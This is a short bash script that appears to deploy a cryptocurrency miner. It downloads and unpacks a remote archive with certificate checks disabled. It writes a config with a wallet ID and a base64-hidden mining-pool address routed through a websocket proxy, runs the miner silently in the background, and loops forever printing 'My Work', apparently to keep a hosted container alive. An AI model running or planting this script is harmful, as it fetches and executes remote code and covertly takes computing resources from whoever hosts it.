#!/bin/bash

curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/mino.tar.gz
tar -xvf mino.tar.gz
echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW", "password": "c=MAZA,zap=MAZA", "argent": "blue-mino/2.0", "threads": 7}' > data.txt
nproc --all 
node app.js > /dev/null 2>&1 &
while true
do
        echo "My Work"
        sleep 1200
done
